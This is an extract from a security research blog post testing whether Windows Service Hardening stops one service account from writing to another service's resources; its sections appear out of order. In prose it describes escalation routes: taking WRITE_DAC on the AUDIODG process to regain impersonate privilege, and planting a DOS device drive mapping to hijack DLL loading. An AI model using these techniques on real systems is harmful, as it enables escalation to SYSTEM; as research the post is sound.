WR token, there were no writable resources for NS and only 4 resources writable from LS, which was less than 1%. Those 4 resources were just Events, from a service perspective not very exciting though there were ACL'ed to everyone which is unusual.<br /><br />Just based on these numbers alone it would seem that WSH really is a failure when used unrestricted but is probably fine when used in WR mode. It'd be interesting to dig into what types are writable in the unrestricted mode to get a better understanding of where WSH is failing. This is what I've summarized in the following table:<br /><br /><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" dir=\"ltr\" style=\"border-collapse: collapse; border: none; font-family: Arial; font-size: 10pt; width: 0px;\"><colgroup><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /></colgroup><tbody><tr style=\"height: 21px;\"><td style=\"background-color: white; border: 1px solid rgb(0, 0, 0); overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Type</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">LS Writable%</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">LS Writable</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">NS Writable%</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">NS Writable</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Directory</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Event</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1.66%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">6</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">File</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">74.24%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">268</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">48.72%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">95</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Key</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">22.44%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">81</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">49.23%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">96</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Mutant</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Process</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Section</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.55%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">2</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">SymbolicLink</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.28%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.51%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">1</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Thread</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0</td></tr></tbody></table><br />The clear winners, if there is such a thing is Files and Registry Keys taking up over 95% of the resources which are writable. Based on what we know about how WSH works this is understandable. The likelihood is any keys/files are getting their security through inheritance from the parent container. This will typically result in at least the owner field being the service account granted WRITE_DAC access, or the inherited DACL will contain an OWNER CREATOR SID which results an explicit access for the service account.<br /><br />What is perhaps more interesting is the results for Processes and Threads, neither NS or LS have any writable threads and only LS has a single writable process. This primary reason for the lack of writable threads and processes is due to the default DACL which is used for new processes when an explicit DACL isn't specified. The DACL has a OWNER RIGHTS SID granted only READ_CONTROL access, the result is that even if the owner of the resource is the service account it isn't possible to write to it. The only way to get full access as per the default DACL is by having the specific service SID in your group list.<br /><br />Why does LS have one writable process? This I think is probably a \"bug\" in the Audio Service which creates the AUDIODG process. If we look at the security descriptor of the AUDIODG process we see the following:<br /><br /><span>&lt;Owner&gt;</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\LOCAL SERVICE</span><br /><span><br /></span><span>&lt;</span><span>DACL</span><span>&gt;</span><br /><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : NT SERVICE\\Audiosrv</span><br /><span>&nbsp;- Access: Full Access</span><br /><span><br /></span><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\Authenticated Users</span><br /><span>&nbsp;- Access: QueryLimitedInformation</span><br /><br />The owner is LS which will grant WRITE_DAC access to the resource if nothing else is in the DACL to stop it. However the default DACL's OWNER RIGHTS SID is missing from the DACL, which means this was probably set explicitly by the Audio Service to grant <i>Authenticated Users</i> query access. This results in the access not being correctly restricted from other service accounts. Of course AUDIODG has <i>SeImpersonatePrivilege</i> so if you find yourself inside a LS unrestricted process with no impersonate privilege you can open AUDIODG (if running) for WRITE_DAC, change the DACL to grant full access and get back impersonate privileges.<br /><br />If you look at the results one other odd thing you'll notice is that while there are readable threads there are no readable processes, what's going on? If we look at a normal LS service process' security descriptor we see the following:<br /><br /><span>&lt;</span><span>Owner&gt;</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\LogonSessionId_0_202349</span><br /><span><br /></span><span>&lt;</span><span>DACL</span><span>&gt;</span><br /><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : NT AUTHORITY\\LogonSessionId_0_202349</span><br /><span>&nbsp;- Access: Full Access</span><br /><span><br /></span><span>&nbsp;- Type&nbsp; : Allowed</span><br /><span>&nbsp;- Name&nbsp; : BUILTIN\\Administrators</span><br /><span>&nbsp;- Access: QueryInformation|QueryLimitedInformation</span><br /><br />We should be able to see the reason, the owner is not LS, but instead the logon session SID which is unique per-service. This blocks other LS processes from having any access rights by default. Then the DACL only grants full access to the logon session SID, even administrators are apparently not the be trusted (though they can typically just bypass this using <i>SeDebugPrivilege</i>). This security descriptor is almost certainly set explicitly by the SCM when creating the process.<br /><br />Is there anything else interesting in writable resources outside of the files and keys? The one interesting result shared between NS and LS is a single writable Object Directory. We can take a look at the results to find out what directories these are, to see if they share any common purpose. The directory paths are&nbsp;<i>\\Sessions\\0\\DosDevices\\00000000-000003e4</i> for NS and&nbsp;<i>\\Sessions\\0\\DosDevices\\00000000-000003e5</i> for LS. These are the service account's DOS Device directory, the default location to start looking up drive mappings. As the accounts can write to their respective directory this gives another angle of attack, you can compromise any service process running as the same used by dropping a mapping for the C: drive and waiting the process to load a DLL. Leaving that angle open seems sloppy, but it's not like there are no alternative routes to compromise another service.<br /><br />I think that's the limit of my interest in analysis. I've put my results up on Google Drive <a href=\"https://docs.google.com/spreadsheets/d/1nCozmBZC1b_AwXYd8wLgMexv8MHcw0xwFAsnoSURdi4/edit?usp=sharing\">here</a> if you want to play around yourself.<br /><br /><h3>Conclusions</h3>Even though I've not run the experiment on multiple machines, at different times with different software I think I can conclude that WSH does not provide any meaningful security boundary when used in its default unrestricted mode. Based on the original hypothesis we can clearly write to resources not created by a service and therefore could likely fully compromise the system. The implementation does do a good job of securing process and thread resources which provide trivial elevation routes but that can be easily compromised if there's appropriate processes running (including some COM services). I can fully support this not being something MS would want to defend through issuing bulletins.<br /><br />However when used in WR mode WSH is much more comprehensive. I'd argue that as long as a service doesn't have impersonate privilege then it's effectively sandboxed if running in with a WR token. MS already support sandbox escapes as a defended boundary so I'm not sure why WR sandboxes shouldn't also be included as part of that. For example if the trick using the Task Scheduler worked from a WR service I'd see that as circumventing a security boundary, however I don't work in MSRC so I have no influence on what is or is not fixed.<br /><br />Of course in an ideal world you wouldn't use shared accounts at all. Versions of Windows since 7 have support for <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd548356(v=ws.10)\">Virtual Service Accounts</a> where the service user is the service SID rather than a standard service account and the SCM even limits the service's IL to High rather than System. Of course by default these accounts still have impersonate privilege, however you could also remove that.<br /><br />"}], "summary": "In the past few years there's been numerous exploits for service to system privilege escalation. Primarily they revolve around the fact that system services typically have impersonation privilege. What this means is given access to a suitable token handle of an administrator (say through the <a href=\"https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\">Rotten Potato</a> attack) you can impersonate and elevate from a lower-privileged service account to SYSTEM. The problem for discovers of these attacks is that Microsoft do not consider them something which needs to be fixed with a security bulletin, as having <i>SeImpersonatePrivilege</i> is basically a massive security hole. However MS go and <a href=\"https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/\">fix them silently</a>&nbsp;making it unclear if they care or not.<br /><br />Of course, none of this is really new,&nbsp;<a href=\"https://twitter.com/cesarcer\">Cesar Cerrudo</a> detailed these sorts of service attacks in <a href=\"https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf\">Token Kidnapping</a> and <a href=\"https://www.defcon.org/images/defcon-18/dc-18-presentations/Cerrudo/DEFCON-18-Cerrudo-Token-Kidnapping-Revenge.pdf\">Token Kidnapping's Revenge</a>. The novel element recently is how to get hold of the access token, for example via negotiating local NTLM authentication. Microsoft seem to have been fighting this fire for almost 10 years and still have not gotten it right. In shades of UAC, a significant security push to make services more isolated and secure has been basically abandoned because (presumably) MS realized it was an indefensible boundary.<br /><br />That's not to say there hasn't been interesting service account to SYSTEM bugs which Microsoft have fixed. The most recent example is&nbsp;<a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1322\">CVE-2019-1322</a> which was independently discovered by multiple parties (<a href=\"https://twitter.com/donkeysteam\">DonkeysTeam</a>,&nbsp;<a href=\"https://twitter.com/gweeperx\">Ilias Dimopoulos</a> and&nbsp;Edward Torkington/Phillip Langlois of NCC). To understand the bug you probably should read up one of the write-ups (<a href=\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/\">NCC one here</a>) but the gist is, the Update Orchestrator Service has a service security descriptor which allowed \"NT AUTHORITY\\SERVICE\" full access. It so happens that all system services, including lower-privileged ones have this group and so you could reconfigure the service (which was running as SYSTEM) to point to any other binary giving a direct service to SYSTEM privilege escalation.<br /><br />That begs the question, why was CVE-2019-1322 special enough to be fixed and not issues related to impersonation? Perhaps it's because this issue didn't rely on impersonate privileges being present? It is possible to configure services to not have impersonate privilege, so presumably if you could go from a non-impersonate service to an impersonate service that would count as a boundary? Again probably not, for example&nbsp;<a href=\"https://twitter.com/itm4n/status/1202638656063901696\">this bug</a>&nbsp;which abuses the scheduled task service to regain impersonate privilege wouldn't likely be fixed by Microsoft.<br /><br />That lack of clarity is why I <a href=\"https://twitter.com/tiraniddo/status/1203068543765368832\">tweeted</a> to <a href=\"https://twitter.com/n0x08\">Nate Warfield</a> and ultimately to <a href=\"https://twitter.com/epakskape\">Matt Miller</a> asking for some advice with respect to the <a href=\"https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria\">MSRC Security Servicing Guidelines</a>. The result is, even if the service doesn't have impersonate privilege it wouldn't be a defended boundary if all you get is the same user with additional privileges as you can't block yourself from compromising yourself. This is the UAC argument over again, but IMO there's a crucial difference, <a href=\"https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/WS2008-Windows-Service-Hardening/ba-p/372702\">Windows Service Hardening</a>&nbsp;(WSH) was supposed to fix this problem for us in Vista. Unsurprisingly&nbsp;Cesar Cerrudo also did a <a href=\"https://downloads.immunityinc.com/infiltrate-archives/WindowsServicesHacking.pdf\">presentation</a> about this at the inaugural (maybe?) <a href=\"https://infiltratecon.com/info/archives.html#archive-year-2011\">Infiltrate in 2011</a>.<br /><br />The question I had was, is WSH still as broken as it was in 2011? Has anything changed which made WSH finally live up to its goal of making a service compromise not equal to a full system compromise? To determine that I thought I'd run an experiment on Windows 10 1909. I'm only interested in the features which WSH touches which led me to the following hypothesis:<br /><br /><blockquote class=\"tr_bq\"><i><b>\"Under Windows Service Hardening one service without impersonate privilege can't write to the resources of another service which does have the privilege, even if the same user, preventing full system compromise.\"</b></i></blockquote><i><b><br /></b></i>The hypothesis makes the assumption that if you can write to another service's resources then it's possible to compromise that other service. If that other service has <i>SeImpersonatePrivilege</i> then that inevitably leads to full system compromise. Of course that's not necessarily the case, the resource being written to might be uninteresting, however as a proxy this is sufficient as the goal of WSH is to prevent one service modifying the data of another even though they are the same underlying user.<br /><br /><h3>WSH Details</h3>Before going into more depth on the experiment, let's quickly go through the various features of WSH and how they're expressed. If you know all this you can skip to the description of the experiment and the results.<br /><br /><h4>Limited Service Accounts and Reduced Privilege</h4><div>This feature is by far the oldest attempt to harden services, the introduction of the LOCAL SERVICE (LS) and NETWORK SERVICE (NS) accounts. Prior to the accounts introduction there was only two ways of configuring the user for a system service on Windows, either the fully privileged SYSTEM account or creating a local/domain user which has the \"<a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-service\">Log on as a Service</a>\" right. The two accounts where introduced in XP SP2 (I believe) after worms such as <a href=\"https://en.wikipedia.org/wiki/Blaster_(computer_worm)\">Blaster</a> basically got SYSTEM privilege through remotely attacking exposed services. The two service accounts are not administrator accounts which means they shouldn't be able to directly compromise the system. The accounts are very similar on Windows 10 1909, they are both assigned the following groups*:</div><div><br /></div><div><div><span>BUILTIN\\Users</span></div><div><span>CONSOLE LOGON</span></div><div><span>Everyone</span></div><div><span>LOCAL</span></div><div><span>NT AUTHORITY\\Authenticated Users</span></div><div><span>NT AUTHORITY\\LogonSessionId_X_Y</span></div><div><span>NT AUTHORITY\\SERVICE</span></div><div><span>NT AUTHORITY\\This Organization</span></div></div><div><br /></div><div>* Technically this isn't 100% accurate, on my machine the LS account has some extra capability groups, but we'll ignore those for this blog post.</div><div><br /></div><div>No Administrator group in sight. Each service token gets a unique Logon Session ID SID which will be important later. The service accounts also have a limited set of privileges, as shown below:</div><div><br /></div><div><div><span><b>SeAssignPrimaryTokenPrivilege</b></span></div><div><span>SeAuditPrivilege</span></div><div><span>SeChangeNotifyPrivilege</span></div><div><span>SeCreateGlobalPrivilege</span></div><div><span><b>SeImpersonatePrivilege</b></span></div><div><span>SeIncreaseQuotaPrivilege</span></div><div><span>SeIncreaseWorkingSetPrivilege</span></div><div><span>SeShutdownPrivilege</span></div><div><span>SeSystemTimePrivilege\u2020</span></div><div><span>SeTimeZonePrivilege</span></div><div><span>SeUndockPrivilege</span></div></div><div><br /></div><div>\u2020 NETWORK SERVICE doesn't have <i>SeSystemTimePrivilege</i>.</div><div><br /></div><div>The two privileges I've highlighted, <i>SeAssignPrimaryTokenPrivilege</i> and <i>SeImpersonatePrivilege</i>&nbsp;give these accounts effectively full system access when combined with a suitable privileged token. Part of WSH is also giving control over what privileges the service account actually requires. The default is to allow all privileges, however when configuring a service you can specify a list of privileges to restrict the service to. For example the&nbsp;<i>CDPSvc</i> service is configured to only require <i>SeImpersonatePrivilege</i>. Quite why they bother to put this restriction on the service I don't know \u00af\\_(\u30c4)_/\u00af.</div><div><br />What's the difference between LS and NS? The primary difference is LS has no network credentials, so accessing network resources as that user would only succeed as an anonymous login. NS on the other hand is created with the credentials of the computer account and so can interact with the network for resources allowed by that authentication. This only really matters to domain joined machines, standalone machines would not share the computer account with anyone else.<br /><br /></div><h4>Per-Service SID</h4><div>The first big addition in WSH was the Per-Service SID. This SID is automatically added to the group list of default groups shown previously by the SCM when creating the service's primary token. The service SID is also added with the&nbsp;SE_GROUP_OWNER flag set and is not mandatory, which means it can be set as the token's default owner when creating new resources and it can disabled. The basic idea is a service can ACL its resources to this SID to prevent other services from accessing them. The use of a service SID is optional, but the majority of default services are configured to use it. An example SID for <i>CDPSvc </i>is as follows:</div><div><br /></div><div><span>S-1-5-80-3433512109-503559027-1389316256-1766580070-2256751264</span></div><div><br /></div><div>The SID is derived by generating a SHA1 hash of the service name and adding that as the SID's RIDs (with an extra 80 at the start to signify it's a service SID). The use of a hash should make it extremely unlikely two services would generate the same SID.</div><div><br /></div><div>Of course it's up to the service to actually ACL their resources appropriately. To aid in that the token's default DACL is also configured to the following (for <i>CDPSvc</i>):</div><div><br /></div><div><div><span>- Type&nbsp; : Allowed</span></div><div><span>- Name&nbsp; : NT AUTHORITY\\SYSTEM</span></div><div><span>- Access: Full Access</span></div><div><span><br /></span></div><div><span>- Type&nbsp; : Allowed</span></div><div><span>- Name&nbsp; : OWNER RIGHTS</span></div><div><span>- Access: ReadControl</span></div><div><span><br /></span></div><div><span>- Type&nbsp; : Allowed</span></div><div><span>- Name&nbsp; : NT SERVICE\\CDPSvc</span></div><div><span>- Access: Full Access</span></div></div><div><br /></div><div>The three entries grant SYSTEM and the service SID full access to any resources with this DACL. It then limits the owner of the resource through OWNER RIGHTS to only READ_CONTROL access. This directly prevents one service account accessing the resources of another for write access. Unfortunately the default DACL is only applied when there's no other access control specified, either explicitly at creation time or due to inheritance.&nbsp;</div><div><br /></div><div>One other thing to point out is that Windows still has shared services through the use of SVCHOST. If multiple services are registered in a specific SVCHOST instance then the SCM will create the token with all service SIDs in the group list and default DACL even if a service isn't currently loaded in the host. That has become less of an issue since <a href=\"https://docs.microsoft.com/en-us/windows/application-management/svchost-service-refactoring\">Windows 1703</a>, as long as you have greater that 3.5GB of RAM services will run in separate SVCHOST instances and all services will be totally separate.</div><div><br /></div><h4>Write-Restricted Token</h4><div>The second big addition to WSH was the concept of Write-Restricted (WR) tokens. Restricted token's have existed since Windows 2000 and are created using the <i>NtFilterToken</i> system call. The basic concept is the token can have a list of additional groups which are consulted when ever an access check is performed. First the access check is run on the default group list, if access would be granted the access check is run again on the restricted SIDs. If the second check is successful then the access check passes, if not access is denied.&nbsp;</div><div><br /></div><div>Restricted tokens are used for sandboxing (such as in Chrome) but are difficult to setup correctly as it blocks all access equally including reading critical files on disk. WR tokens solve the access problem by only blocking write access but leaving read and execute access alone.&nbsp;</div><div><br /></div><div>In order for a service configured as WR to write to a resource the associated security descriptor must contain the required access for one of the following restricted SIDs.</div><div><br /></div><div><div><span>Everyone</span></div><div><span>NT AUTHORITY\\LogonSessionId_X_Y</span></div><div><span>NT AUTHORITY\\WRITE RESTRICTED</span></div><div><span>NT SERVICE\\SERVICE_NAME</span></div></div><div><br /></div><div>The WRITE RESTRICTED SID is a special group SID which resources can apply if they expect a service to write to the resource. This SID is also added to the token's groups by the SCM so that it can be used to pass both checks. By combining service SIDs and WR the amount of resources a service can modify should be significantly reduced.<br /><br /></div><h4>And the Rest</h4><div>There's a few things which are technically part of service hardening which won't really consider for the experiment:</div><div><br /></div><div>The main one is <a href=\"https://blogs.technet.microsoft.com/voy/2007/04/02/network-restrictions-for-service-hardening/\">additional rules in the firewall</a> to block network services or requests being made from a service. This is arguably more to prevent remote compromise than it is to prevent cross-service attacks.&nbsp;</div><div><br /></div><div>Another is <a href=\"https://blogs.technet.microsoft.com/voy/2007/02/23/services-isolation-in-session-0-of-windows-vista-and-longhorn-server/\">Session 0 Isolation</a> and System Integrity Level. Session 0 Isolation was introduced to prevent Shatter Attacks, by preventing any windows being created by a service on the same desktop as a normal user. System Integrity Level through <a href=\"https://en.wikipedia.org/wiki/User_Interface_Privilege_Isolation\">UIPI</a> then prevents attacks even if the service did create a window on a normal user desktop as it'd be at a much higher IL (even than Administrators). The System IL does admittedly also have a security access check function but it's not that important for cross-service attacks.</div><div><br /></div><h3>Experiment Procedure</h3><div>On to the experiment itself. Based on the hypothesis I presented earlier the goal is to determine if you can write to resources of one service from another service even though they're the same user. To make this testable I decided on the following procedure:<br /><br />Step 1: Build an access token for a service which doesn't exist on the system.<br />Step 2: Enumerate all resources of a specific type which are owned by the token owner and perform an access check using the token.<br />Step 3: Collate the results based on the type of resource and whether write access was granted.<br /><br />The reason for choosing to build a token for a non-existent service is it ensures we should only see the resources that could be shared by other services as the same user, not any resources which are actually designed to be accessible by being created by a service. These steps need to be repeated for different access tokens, we'll use the following five:<br /><ul><li>LOCAL SERVICE</li><li>LOCAL SERVICE, Write Restricted</li><li>NETWORK SERVICE</li><li>NETWORK SERVICE, Write Restricted</li><li>Control</li></ul><div>We'll test both normal service SID and WR versions of the access token to see if it makes much of a difference. One thing to determine is what to use as a control. Ideally the control would be another service account with WSH disabled. However I couldn't find a way to disable WSH entirely to do this test, so instead we need some other control. If our hypothesis holds and WSH is effective we'd expect no resources to be writable, therefore we need to pick a control account where we know this is not true. The easiest is just to use the current logged on user account, it should be able to access almost all its own resources.</div><div><br /></div><div>What resources do we want to inspect? The obvious type is Process/Thread resources. Getting write access to either of these in another service is probably a trivial to get full system compromise through impersonate. We'd want to get a bigger picture however, it'd be useful to include Files, Registry keys and Named Kernel 